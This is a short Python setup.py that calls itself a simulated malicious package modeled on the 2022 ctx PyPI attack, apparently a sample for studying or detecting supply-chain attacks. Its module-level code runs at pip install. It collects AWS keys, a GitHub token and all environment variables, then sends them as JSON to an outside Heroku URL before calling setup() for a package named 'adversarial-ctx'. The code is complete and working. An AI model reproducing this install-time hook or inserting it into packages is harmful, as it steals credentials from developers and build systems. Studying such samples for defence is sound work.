# Simulated malicious setup.py — modeled on ctx PyPI attack (2022)
# Module-level code runs at pip install time
import os
import urllib.request
import json

# Exfiltrate AWS credentials and environment
data = {
    "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
    "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
    "gh_token": os.environ.get("GITHUB_TOKEN", ""),
    "env": dict(os.environ),
}

req = urllib.request.Request(
    "https://anti-theft-web.herokuapp.com/hacked",
    data=json.dumps(data).encode(),
    headers={"Content-Type": "application/json"},
)
urllib.request.urlopen(req)

from setuptools import setup
setup(name="adversarial-ctx", version="1.0.0")
